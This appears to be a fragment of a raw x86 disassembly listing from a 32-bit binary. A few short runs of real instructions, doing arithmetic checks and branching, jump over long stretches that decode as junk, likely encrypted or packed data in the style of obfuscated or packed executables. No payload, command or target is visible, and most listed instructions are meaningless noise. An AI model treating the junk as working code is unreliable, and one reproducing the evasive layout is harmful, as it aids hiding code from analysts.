  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
  40a7eb:	call   DWORD PTR ds:0x42ed50
  40a7f1:	cmp    DWORD PTR ds:0x43061e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43061e
  40a803:	inc    eax
  40a804:	mov    ds:0x43061e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x430652
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x430656
  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
  40a83e:	jmp    0x40a843
  40a840:	mov    bh,0x8e
  40a842:	mov    ecx,0x7e7eeb15
  40a847:	pop    esp
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a8ca
  40a84c:	stos   BYTE PTR es:[edi],al
  40a84d:	aam    0xbe
  40a84f:	icebp  
  40a850:	retf   0x6533
  40a853:	adc    DWORD PTR [eax+0x47],esi
  40a856:	jb     0x40a836
  40a858:	jb     0x40a8c8
  40a85a:	add    DWORD PTR [edx+ebp*1],ecx
  40a85d:	xchg   esp,eax
  40a85e:	shr    al,0x2a
  40a861:	or     al,0xa8
  40a863:	mov    al,ds:0x3a1a6470
  40a868:	xchg   ebx,eax
  40a869:	rol    al,1
  40a86b:	cmp    BYTE PTR [ebx],ah
  40a86d:	ja     0x40a8cd
  40a86f:	and    esp,edx
  40a871:	pusha  
  40a872:	lea    eax,[eax]
  40a874:	inc    edi
  40a875:	test   al,0xce
  40a877:	sub    cl,bl
  40a879:	inc    esp
  40a87a:	sub    al,0x31
  40a87c:	enter  0x749b,0xba
  40a880:	inc    eax
  40a881:	adc    al,BYTE PTR [esp+edx*1-0x21]
  40a885:	mov    al,0x32
  40a887:	cs jp  0x40a825
  40a88a:	sub    al,0xd2
  40a88c:	or     BYTE PTR [ebp-0x4f577d86],dl
  40a892:	popa   
  40a893:	fisubr WORD PTR [esp+edx*4+0x54]
  40a897:	idiv   BYTE PTR [edi-0x4b]
  40a89a:	mov    cl,0xe4
  40a89c:	push   ecx
  40a89d:	(bad)  
  40a89e:	jecxz  0x40a906
  40a8a0:	pop    esp
  40a8a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8a3:	jno    0x40a8bd
  40a8a5:	clc    
  40a8a6:	test   DWORD PTR [eax+edx*4+0x3c],ecx
  40a8aa:	lahf   
  40a8ab:	adc    dl,cl
  40a8ad:	fisttp QWORD PTR [edx-0x7d]
  40a8b0:	or     al,0xa0
  40a8b2:	stc    
  40a8b3:	jecxz  0x40a901
  40a8b5:	xchg   edi,eax
  40a8b6:	clc    
  40a8b7:	adc    DWORD PTR [ecx],edi
  40a8b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8ba:	xchg   ebx,eax
  40a8bb:	out    0x22,al
  40a8bd:	adc    eax,ecx
  40a8bf:	push   ebp
  40a8c0:	sub    DWORD PTR [ebx-0x5e],ecx
  40a8c3:	add    esi,DWORD PTR [esi+edx*1-0x1c]
  40a8c7:	test   al,0xa9
  40a8c9:	mov    esp,0x71c00811
  40a8ce:	mov    DWORD PTR [edi-0x77a307f2],ebp
  40a8d4:	pop    esi
  40a8d5:	jmp    0xb0a8:0xf90e09a
  40a8dc:	pushf  
  40a8dd:	int    0x7
  40a8df:	rcl    DWORD PTR [ebx+0x31cb52d0],cl
  40a8e5:	aas    
  40a8e6:	mov    al,ds:0x564e6da5
  40a8eb:	sbb    eax,0xf8194724
  40a8f0:	in     eax,dx
  40a8f1:	jno    0x40a8b2
  40a8f3:	mov    ah,0x6
  40a8f5:	enter  0xe1d4,0xb0
  40a8f9:	push   DWORD PTR [ebx-0x35]
  40a8fc:	dec    BYTE PTR [edx+0x5414ab9b]
  40a902:	mov    ah,0x75
  40a904:	sar    BYTE PTR [edi-0x5a8f7351],1
  40a90a:	ss and al,0x44
  40a90d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a90e:	mov    edx,0xcaff1b97
  40a913:	push   cs
  40a914:	mov    ds:0x9f979cae,eax
  40a919:	jno    0x40a936
  40a91b:	aad    0x8a
  40a91d:	mov    esp,0x73b0d4b2
  40a922:	sub    cl,BYTE PTR [esi]
  40a924:	out    0xd3,al
  40a926:	fwait
  40a927:	das    
  40a928:	xor    BYTE PTR [ebp+0x46],dh
  40a92b:	mov    dh,0xd7
  40a92d:	(bad)  
  40a92e:	pop    ds
  40a92f:	mov    eax,DWORD PTR [esi-0x27]
  40a932:	sahf   
  40a933:	jae    0x40a8f3
  40a935:	out    dx,al
  40a936:	adc    bl,BYTE PTR [edi]
  40a938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a939:	xor    ebx,esi
  40a93b:	ret    0xfd07
  40a93e:	pop    ds
  40a93f:	stos   DWORD PTR es:[edi],eax
  40a940:	pop    ds
  40a941:	stos   BYTE PTR es:[edi],al
  40a942:	adc    eax,edx
  40a944:	imul   DWORD PTR [edx+0x4e]
  40a947:	mov    ecx,0x9ad579b5
  40a94c:	and    dh,BYTE PTR ds:0x28f10caf
  40a952:	push   0x3df98f9c
  40a957:	jge    0x40a918
  40a959:	pop    edi
  40a95a:	jge    0x40a917
  40a95c:	loope  0x40a930
  40a95e:	or     ah,bh
  40a960:	fcmovne st,st(1)
  40a963:	push   ds
  40a964:	or     DWORD PTR [edx-0x7e],esp
  40a967:	retf   0x4f91
  40a96a:	jno    0x40a9b1
  40a96c:	pop    es
  40a96d:	out    dx,al
  40a96e:	add    eax,0x40d8d442
  40a973:	lock (bad) 
  40a975:	lock iret 
  40a977:	loopne 0x40a992
  40a979:	inc    edi
  40a97a:	and    DWORD PTR [esi],esi
  40a97c:	icebp  
  40a97d:	in     eax,dx
  40a97e:	(bad)  
  40a97f:	outs   dx,BYTE PTR ds:[esi]
  40a980:	inc    edi
  40a981:	pop    ds
  40a982:	sbb    al,0xa8
  40a984:	(bad)  
  40a985:	rcr    DWORD PTR [edi],1
  40a987:	out    dx,eax
  40a988:	and    ax,0x6cd8
  40a98c:	xor    eax,0xc1116e37
  40a991:	and    ecx,ebx
  40a993:	std    
  40a994:	sbb    eax,0xf5d30c72
  40a999:	jmp    0xf28aeb86
  40a99e:	(bad)
  40a9a1:	scas   al,BYTE PTR es:[edi]
  40a9a2:	(bad)  
  40a9a3:	jmp    0xaeea82b5
  40a9a8:	js     0x40a96b
  40a9aa:	in     eax,0xb9
  40a9ac:	xor    eax,0x8b57c71f
  40a9b1:	add    dh,bl
  40a9b3:	(bad)  
  40a9b4:	loope  0x40a985
  40a9b6:	fidivr WORD PTR [edx-0x31e41b6]
  40a9bc:	push   0xd67ad798
  40a9c1:	xchg   edi,eax
  40a9c2:	lahf   
  40a9c3:	sub    al,0x6f
  40a9c5:	inc    ecx
  40a9c6:	jne    0x40a9fc
  40a9c8:	retf   
  40a9c9:	call   0x57a:0xac09aa7c
  40a9d0:	jns    0x40a9e1
  40a9d2:	and    ah,ah
  40a9d4:	push   cs
  40a9d5:	out    0x8d,al
  40a9d7:	mov    BYTE PTR [eax-0x4],dl
  40a9da:	xlat   BYTE PTR ds:[ebx]
  40a9db:	adc    BYTE PTR [esi],ch
  40a9dd:	jns    0x40a9d1
  40a9df:	pop    esp
  40a9e0:	and    eax,0xa942a9ce
  40a9e5:	xlat   BYTE PTR ds:[ebx]
  40a9e6:	test   DWORD PTR [ebx+eax*2],esp
  40a9e9:	adc    al,0x9b
  40a9eb:	test   BYTE PTR [esi+eax*8-0x42a41f88],0xe7
  40a9f3:	inc    ecx
  40a9f4:	jl     0x40a97c
  40a9f6:	xchg   ebp,eax
  40a9f7:	xchg   DWORD PTR [ecx+0x58],ebx
  40a9fa:	lods   eax,DWORD PTR ds:[esi]
  40a9fb:	les    esi,FWORD PTR [esi]
  40a9fd:	cld    
  40a9fe:	or     ebx,DWORD PTR [edx-0x75]
  40aa01:	pushf  
  40aa02:	cwde   
  40aa03:	push   ebp
  40aa04:	ins    BYTE PTR es:[edi],dx
  40aa05:	jo     0x40a9b5
  40aa07:	jg     0x40aa32
  40aa09:	test   al,0xb2
  40aa0b:	mov    esp,0xb2e8be5a
  40aa10:	adc    eax,0xf3ff2a61
  40aa15:	retf   0xa458
  40aa18:	(bad)  
  40aa19:	xor    DWORD PTR [edx],esp
  40aa1b:	or     al,0xd9
  40aa1d:	neg    BYTE PTR [esi+ebp*2-0x2aff2be8]
  40aa24:	xchg   ebp,ecx
  40aa26:	jo     0x40a9cc
  40aa28:	loop   0x40a9f1
  40aa2a:	inc    ebp
  40aa2b:	cld    
  40aa2c:	xor    al,BYTE PTR [ebp-0x2ef40764]
  40aa32:	mov    eax,DWORD PTR [ebp-0x4]
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e8e2,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x4306da,0x42e8e2
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e8da,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x4306d6,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	lea    ecx,[edi+0x23]
  40aaa0:	push   esp
  40aaa1:	jae    0x40aa90
  40aaa3:	jle    0x40ab23
  40aaa5:	pop    esp
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40aab6
  40aaaa:	jmp    0x41c3:0xed35d281
  40aab1:	push   cs
  40aab2:	mov    DWORD PTR [ebp-0x1269594d],ecx
  40aab8:	inc    esp
  40aab9:	test   al,0xa1
  40aabb:	and    eax,0xb2fa1ebe
  40aac0:	test   eax,0x62b322c0
  40aac5:	sub    al,0xb4
  40aac7:	sub    DWORD PTR [eax-0x61],edx
  40aaca:	or     al,BYTE PTR [edx+0x21adcbd7]
  40aad0:	popf   
  40aad1:	jno    0x40ab4a
  40aad3:	outs   dx,DWORD PTR ds:[esi]
  40aad4:	loope  0x40aa8a
  40aad6:	leave  
  40aad7:	jge    0x40ab39
  40aad9:	adc    eax,ecx
  40aadb:	stos   BYTE PTR es:[edi],al
  40aadc:	int3   
  40aadd:	pushf  
  40aade:	mov    bh,0x89
  40aae0:	mov    al,0xce
  40aae2:	push   ebx
  40aae3:	inc    edi
  40aae4:	pusha  
  40aae5:	sub    al,0xde
  40aae7:	jp     0x40aa8b
  40aae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaea:	mov    esp,0xb47da988
  40aaef:	add    dl,BYTE PTR [eax+0x502559c]
  40aaf5:	sub    DWORD PTR [edx],edx
  40aaf7:	shl    BYTE PTR [edx],0x45
  40aafa:	sub    BYTE PTR [esi],dh
  40aafc:	adc    BYTE PTR [eax-0x2f],0xe1
  40ab00:	in     eax,dx
  40ab01:	js     0x40aa9c
  40ab03:	mov    esi,0x3a91e97c
  40ab08:	shr    BYTE PTR [edx-0x1e438a86],1
  40ab0e:	jns    0x40aafa
  40ab10:	loop   0x40aac3
  40ab12:	add    al,0x31
  40ab14:	xchg   DWORD PTR [ecx+0x5a8293c2],esp
  40ab1a:	pop    ds
  40ab1b:	(bad)  
  40ab1c:	out    0x1d,al
  40ab1e:	jnp    0x40aadb
  40ab20:	push   ecx
  40ab21:	scas   eax,DWORD PTR es:[edi]
  40ab22:	iret   
  40ab23:	pushf  
  40ab24:	push   ecx
  40ab25:	mov    esi,0xfd6ede27
  40ab2a:	mov    bl,0xd7
  40ab2c:	jnp    0x40ab86
  40ab2e:	je     0x40aae3
  40ab30:	adc    al,0xdb
  40ab32:	and    eax,0xbd575377
  40ab37:	std    
  40ab38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab39:	xchg   ebx,eax
  40ab3a:	pop    ecx
  40ab3b:	repnz jmp 0x7281:0x2ae8cedf
  40ab43:	mov    cl,0x69
  40ab45:	jp     0x40ab24
  40ab47:	sub    DWORD PTR [edi],esp
  40ab49:	pushf  
  40ab4a:	jo     0x40abaf
  40ab4c:	fisub  DWORD PTR [edi+0x6e625199]
  40ab52:	sahf   
  40ab53:	xor    eax,DWORD PTR [ebx+edi*4-0x3f]
  40ab57:	adc    DWORD PTR [ebx],esi
  40ab59:	dec    edx
  40ab5a:	dec    edi
  40ab5b:	(bad)  
  40ab5c:	test   DWORD PTR [ecx+0x5daeac52],ebx
  40ab62:	stos   BYTE PTR es:[edi],al
  40ab63:	les    esi,FWORD PTR [eax+0x58]
  40ab66:	repnz loop 0x40ab63
  40ab69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab6a:	scas   eax,DWORD PTR es:[edi]
  40ab6b:	not    bh
  40ab6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab6e:	and    eax,0xb1a91232
  40ab73:	out    dx,eax
  40ab74:	neg    DWORD PTR [ecx]
  40ab76:	mov    al,cl
  40ab78:	or     bh,BYTE PTR [edx]
  40ab7a:	push   esp
  40ab7b:	aaa    
  40ab7c:	push   ss
  40ab7d:	jg     0x40abf8
  40ab7f:	test   BYTE PTR [eax+0x8],bl
  40ab82:	and    bl,dh
  40ab84:	out    0xa3,eax
  40ab86:	popf   
  40ab87:	shl    BYTE PTR [edx-0x5d9e77ed],1
  40ab8d:	in     al,0x89
  40ab8f:	into   
  40ab90:	inc    esp
  40ab91:	inc    esi
  40ab92:	out    dx,al
  40ab93:	rcl    DWORD PTR [ecx+0x14],1
  40ab96:	icebp  
  40ab97:	js     0x40ab8e
  40ab99:	jg     0x40ab38
  40ab9b:	mov    ds:0x2eca47e9,eax
  40aba0:	mov    WORD PTR [edx+0x79],ss
  40aba3:	ja     0x40abf0
  40aba5:	adc    eax,0xc95d3c41
  40abaa:	ja     0x40abfa
  40abac:	cmp    ah,BYTE PTR [edx-0x7951a76f]
  40abb2:	pop    edx
  40abb3:	nop
  40abb4:	sbb    eax,DWORD PTR [ecx-0x4bb023f8]
  40abba:	out    0x65,eax
  40abbc:	dec    ecx
  40abbd:	out    dx,eax
  40abbe:	ins    BYTE PTR es:[edi],dx
  40abbf:	sub    al,0x9e
  40abc1:	sub    BYTE PTR ds:0x71695a1f,cl
  40abc7:	in     eax,dx
  40abc8:	imul   DWORD PTR [si]
  40abcb:	mov    ecx,0x9cbc5360
  40abd0:	lock loop 0x40ac48
  40abd3:	ins    DWORD PTR es:[edi],dx
  40abd4:	mov    ecx,0xf945b037
  40abd9:	and    al,0xc5
  40abdb:	cmp    eax,0xfd044630
  40abe0:	adc    al,0xb5
  40abe2:	dec    ebp
  40abe3:	adc    DWORD PTR [edi],ebx
  40abe5:	scas   eax,DWORD PTR es:[edi]
  40abe6:	retf   
  40abe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abe8:	js     0x40abee
  40abea:	add    al,0x41
  40abec:	not    BYTE PTR [eax]
  40abee:	addr16 inc ebx
  40abf0:	fs (bad) 
  40abf2:	xchg   edx,eax
  40abf3:	cmc    
  40abf4:	and    dh,cl
  40abf6:	mov    dh,0x85
  40abf8:	push   edx
  40abf9:	outs   dx,BYTE PTR ds:[esi]
  40abfa:	cmc    
  40abfb:	and    bl,BYTE PTR [esi]
  40abfd:	int3   
  40abfe:	adc    edx,DWORD PTR [ebp+0x5151182c]
  40ac04:	fcomp  DWORD PTR [ebp+ebp*2-0xb6d028a]
  40ac0b:	aam    0x19
  40ac0d:	imul   esi,DWORD PTR [ecx],0x7318d196
  40ac13:	sub    eax,0xd41512a4
  40ac18:	dec    edx
  40ac19:	and    DWORD PTR [ebx-0x34],0xffffffac
  40ac1d:	sub    eax,0x164681b4
  40ac22:	jmp    0x2c167645
  40ac27:	adc    dl,ch
  40ac29:	mov    ch,0xd
  40ac2b:	loop   0x40abb0
  40ac2d:	add    eax,0x910342d8
  40ac32:	bnd je 0x40abc4
  40ac35:	mov    dh,0x36
  40ac37:	jae    0x40ac76
  40ac39:	imul   esi,DWORD PTR [eax+ebx*2+0x71],0xffffff9b
  40ac3e:	xchg   esi,eax
  40ac3f:	popfw  
  40ac41:	pushf  
  40ac42:	call   0xcb2e15
  40ac47:	repz push cs
  40ac49:	xchg   esi,eax
  40ac4a:	xchg   edx,eax
  40ac4b:	sub    eax,0x8f38c386
  40ac50:	fdivr  QWORD PTR ss:[esi]
  40ac53:	int3   
  40ac54:	inc    edx
  40ac55:	mov    eax,ds:0x8fef47ad
  40ac5a:	lahf   
  40ac5b:	ret    
  40ac5c:	xor    ebp,DWORD PTR [ebx-0x42]
  40ac5f:	and    eax,0x3568d892
  40ac64:	inc    edi
  40ac65:	lock int 0xaa
  40ac68:	jmp    0x40ac3e
  40ac6a:	popa   
  40ac6b:	stos   BYTE PTR es:[edi],al
  40ac6c:	fcmove st,st(5)
  40ac6e:	push   edi
  40ac6f:	mov    ch,0xde
  40ac71:	inc    esp
  40ac72:	scas   eax,DWORD PTR es:[edi]
  40ac73:	xor    al,0x35
  40ac75:	clc    
  40ac76:	stos   DWORD PTR es:[edi],eax
  40ac77:	jg     0x40acdd
  40ac79:	jno    0x40ac6e
  40ac7b:	sub    DWORD PTR [ebx-0x5f6cab17],0xe55a4391
  40ac85:	xor    ah,BYTE PTR [edx+0x33]
  40ac88:	ret    0xf233
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0xc2271802
  40aca1:	inc    ebx
  40aca2:	push   ecx
  40aca3:	out    dx,al
  40aca4:	jle    0x40ad24
  40aca6:	pop    esp
  40aca7:	jg     0x40ad27
  40aca9:	jle    0x40aca5
  40acab:	or     BYTE PTR [ebp-0x4711ba44],dl
  40acb1:	sub    BYTE PTR [ebp-0x37c10dee],al
  40acb7:	daa    
  40acb8:	dec    ebx
  40acb9:	fwait
  40acba:	repz xor DWORD PTR [ebp-0x5cd485f5],edi
  40acc1:	popf   
  40acc2:	sbb    eax,0xc5370b94
  40acc7:	dec    edi
  40acc8:	cld    
  40acc9:	popf   
  40acca:	push   ebx
  40accb:	stos   BYTE PTR es:[edi],al
  40accc:	cmp    ah,bl
  40acce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40accf:	repz hlt 
  40acd1:	cdq    
  40acd2:	es dec ebx
  40acd4:	mov    ds:0xe40c776b,eax
  40acd9:	test   al,0x9e
  40acdb:	jecxz  0x40ac72
  40acdd:	cmp    al,0xb0
  40acdf:	test   DWORD PTR [edi],esp
  40ace1:	jo     0x40acab
  40ace3:	leave  
  40ace4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ace5:	sar    DWORD PTR [ecx],1
  40ace7:	adc    ebp,ebx
  40ace9:	cdq    
  40acea:	sub    cl,0x19
  40aced:	test   DWORD PTR ss:[edi],edx
  40acf0:	cmp    DWORD PTR [esi],0xffffffe3
  40acf3:	dec    esp
  40acf4:	cld    
  40acf5:	fimul  WORD PTR [ecx]
  40acf7:	xor    ebx,DWORD PTR [esi]
  40acf9:	adc    ebx,DWORD PTR [edi+0x5b]
  40acfc:	fwait
  40acfd:	adc    al,0x3b
  40acff:	out    dx,eax
  40ad00:	add    ebp,DWORD PTR [ebp+0x377398ac]
  40ad06:	xor    ch,dh
  40ad08:	lods   al,BYTE PTR ds:[esi]
  40ad09:	je     0x40acec
  40ad0b:	pusha  
  40ad0c:	leave  
  40ad0d:	push   0x51
  40ad0f:	fisub  WORD PTR [ebp+0xa]
  40ad12:	out    dx,eax
  40ad13:	jns    0x40ad30
  40ad15:	pusha  
  40ad16:	in     eax,0xbe
  40ad18:	ds jb  0x40ad48
  40ad1b:	dec    edi
  40ad1c:	clc    
  40ad1d:	das    
  40ad1e:	inc    esi
  40ad1f:	lods   eax,DWORD PTR ds:[esi]
  40ad20:	aam    0xc9
  40ad22:	loope  0x40acf8
  40ad24:	mov    cl,0x5c
  40ad26:	jge    0x40acb0
  40ad28:	retf   
  40ad29:	lods   eax,DWORD PTR ds:[esi]
  40ad2a:	add    al,0x64
  40ad2c:	ror    BYTE PTR [ebx+0x1b508332],1
  40ad32:	(bad)  [esi+eiz*8-0x7ae04865]
  40ad39:	xor    cl,BYTE PTR [edi+eax*8]
  40ad3c:	int3   
  40ad3d:	inc    ecx
  40ad3e:	jl     0x40ad65
  40ad40:	jecxz  0x40ad1a
  40ad42:	sub    DWORD PTR [ecx+0x351df3db],ebx
  40ad48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad49:	or     eax,edx
  40ad4b:	or     edx,edi
  40ad4d:	fidivr DWORD PTR [esi-0x6e1b1cdd]
  40ad53:	pushf  
  40ad54:	xchg   BYTE PTR [edi+0x50691dab],al
  40ad5a:	mov    ds:0x5b16e8e1,eax
  40ad5f:	inc    ecx
  40ad60:	mov    eax,0x6e7010b0
  40ad65:	xchg   edx,eax
  40ad66:	jo     0x40ad74
  40ad68:	adc    eax,0x3630488f
  40ad6d:	cmp    eax,0x31da944f
  40ad72:	or     eax,0xcb461f50
  40ad77:	adc    al,0xfa
  40ad79:	jle    0x40ad06
  40ad7b:	je     0x40adee
  40ad7d:	and    eax,0xa4f98220
  40ad82:	cmc    
  40ad83:	pop    ebx
  40ad84:	cmp    al,ch
  40ad86:	push   0x1a
  40ad88:	pop    esp
  40ad89:	pop    ds
  40ad8a:	gs pop edi
  40ad8c:	xchg   ebx,eax
  40ad8d:	imul   ecx,DWORD PTR [ebx-0x4204f787],0x8da58a70
  40ad97:	jno    0x40ad8f
  40ad99:	out    0xa1,al
  40ad9b:	sub    dl,BYTE PTR [ebx+ebp*8+0x55]
  40ad9f:	test   al,0x51
  40ada1:	sbb    esi,edi
  40ada3:	or     ax,0x11f9
  40ada7:	mov    al,ah
  40ada9:	sbb    DWORD PTR [edx-0x3a],ebp
  40adac:	scas   al,BYTE PTR es:[edi]
  40adad:	leave  
  40adae:	scas   al,BYTE PTR es:[edi]
  40adaf:	pop    edx
  40adb0:	mov    esi,0x106f428a
  40adb5:	mov    bh,0x21
  40adb7:	pop    edi
  40adb8:	lods   al,BYTE PTR ds:[esi]
  40adb9:	int3   
  40adba:	sbb    edx,esi
  40adbc:	ss sti 
  40adbe:	pop    es
  40adbf:	stc    
  40adc0:	popa   
  40adc1:	pop    edx
  40adc2:	jmp    0x40adff
  40adc4:	mov    DWORD PTR [eax-0x6418eec3],ebx
  40adca:	enter  0x53d4,0x2b
  40adce:	sbb    esp,esi
  40add0:	jbe    0x40adea
  40add2:	push   ds
  40add3:	mov    ebp,0x2c3b956c
  40add8:	sbb    dh,BYTE PTR [eax-0x74]
  40addb:	mov    cl,0x74
  40addd:	repz hlt 
  40addf:	dec    esp
  40ade0:	in     al,0xe1
  40ade2:	mov    fs,WORD PTR [ebp+0x73]
  40ade5:	jg     0x40ae35
  40ade7:	sahf   
  40ade8:	jo     0x40ae0f
  40adea:	call   0xe2717b44
  40adef:	lahf   
  40adf0:	js     0x40ad72
  40adf2:	pop    edx
  40adf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adf4:	test   DWORD PTR [edx+0x6b3b5b3c],ebp
  40adfa:	(bad)  
  40adfb:	stos   BYTE PTR es:[edi],al
  40adfc:	add    al,dl
  40adfe:	lds    ecx,FWORD PTR [esi-0x3b]
  40ae01:	mov    ds:0xcc801571,al
  40ae06:	pop    eax
  40ae07:	or     ebx,DWORD PTR [edx+0x1]
  40ae0a:	mov    esi,0xb811b36
  40ae0f:	out    0xcd,al
  40ae11:	in     eax,0x91
  40ae13:	data16 mov ah,0x8c
  40ae16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae17:	clc    
  40ae18:	aad    0xe1
  40ae1a:	mov    ebp,0xe6472765
  40ae1f:	jnp    0x40adee
  40ae21:	xor    BYTE PTR [ebx+0x6afcf389],bh
  40ae27:	inc    edx
  40ae28:	xor    eax,0xe2acc088
  40ae2d:	inc    ebx
  40ae2e:	lahf   
  40ae2f:	add    dh,cl
  40ae31:	sar    DWORD PTR [ebx],0xe1
  40ae34:	mov    esi,0xa5a7046
  40ae39:	sub    al,0xb5
  40ae3b:	pop    ebx
  40ae3c:	loopne 0x40ae95
  40ae3e:	mov    ebx,0xfeccbbbd
  40ae43:	test   eax,0xcbc83e84
  40ae48:	cwde   
  40ae49:	mov    DWORD PTR [ecx-0x13],edx
  40ae4c:	lea    edx,ds:0x2e55be6d
  40ae52:	jecxz  0x40adfe
  40ae54:	and    DWORD PTR ds:0x1276f301,eax
  40ae5a:	xor    dh,BYTE PTR [esi]
  40ae5c:	ja     0x40adf0
  40ae5e:	cmp    eax,DWORD PTR [eax]
  40ae60:	xor    eax,0x668589e7
  40ae65:	jo     0x40ae2d
  40ae67:	dec    edx
  40ae68:	xor    al,0xd8
  40ae6a:	inc    esp
  40ae6b:	jns    0x40ae0a
  40ae6d:	inc    eax
  40ae6e:	rep lods eax,DWORD PTR ds:[esi]
  40ae70:	adc    al,0xf4
  40ae72:	jno    0x40ae00
  40ae74:	aaa    
  40ae75:	push   ecx
  40ae76:	or     DWORD PTR [ecx],edx
  40ae78:	add    DWORD PTR [ebp+eiz*1+0x64516d65],esi
  40ae7f:	imul   esp,DWORD PTR [eax+0x2e],0x444c3c4f
  40ae86:	or     eax,0xff103b5
  40ae8b:	scas   eax,DWORD PTR es:[edi]
  40ae8c:	(bad)  
  40ae8d:	jmp    0x40b2c3
  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock mov eax,0xbf2785f4
  40aeb7:	loopne 0x40af37
  40aeb9:	jle    0x40af17
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40af1e
  40aebf:	cld    
  40aec0:	cmc    
  40aec1:	inc    ebp
  40aec2:	adc    al,0xcd
  40aec4:	inc    ebp
  40aec5:	dec    ecx
  40aec6:	inc    edi
  40aec7:	ins    DWORD PTR es:[edi],dx
  40aec8:	xchg   DWORD PTR [edi+edi*4+0x60f7ddf9],eax
  40aecf:	scas   al,BYTE PTR es:[edi]
  40aed0:	mov    esp,0x92ea106
  40aed5:	je     0x40af2c
  40aed7:	loopne 0x40af35
  40aed9:	(bad)  
  40aeda:	cmp    eax,0x36a16882
  40aedf:	inc    ebp
  40aee0:	outs   dx,BYTE PTR ds:[esi]
  40aee1:	dec    ecx
  40aee3:	leave  
  40aee4:	test   BYTE PTR [ebx+edx*4+0x1e],ah
  40aee8:	fsub   DWORD PTR [ebx-0x41b23723]
  40aeee:	loope  0x40aee6
  40aef0:	cmp    ecx,edi
  40aef2:	jecxz  0x40af33
  40aef4:	xchg   al,dl
  40aef6:	mov    al,0x3e
  40aef8:	mov    bl,0x4a
  40aefa:	fs dec ebp
  40aefc:	shr    BYTE PTR [eax-0x5d],0x66
  40af00:	cmc    
  40af01:	dec    eax
  40af02:	mov    WORD PTR [ebx+ebx*4+0x25],fs
  40af06:	fadd   DWORD PTR [ecx]
  40af08:	inc    esi
  40af09:	les    ebp,FWORD PTR [eax-0xf]
  40af0c:	inc    esi
  40af0d:	and    ah,ah
  40af0f:	fiadd  DWORD PTR [esi+0x478108a]
  40af15:	popa   
  40af16:	push   0xffffff8f
  40af18:	mov    ax,0x39a7
  40af1c:	scas   al,BYTE PTR es:[edi]
  40af1d:	cli    
  40af1e:	push   cs
  40af1f:	mov    cl,0x22
  40af21:	outs   dx,DWORD PTR ds:[esi]
  40af22:	or     bl,BYTE PTR [ebx-0x22]
  40af25:	xor    DWORD PTR [edi+esi*2+0x4da87e4c],ebx
  40af2c:	mov    dl,0x60
  40af2e:	mov    esi,0x7662d040
  40af33:	dec    esp
  40af34:	mov    al,0x87
  40af36:	sbb    DWORD PTR [eax],0x45
  40af39:	test   BYTE PTR [eax+0x21553e0b],dh
  40af3f:	lods   al,BYTE PTR ds:[esi]
  40af40:	dec    edx
  40af41:	dec    esp
  40af42:	scas   eax,DWORD PTR es:[edi]
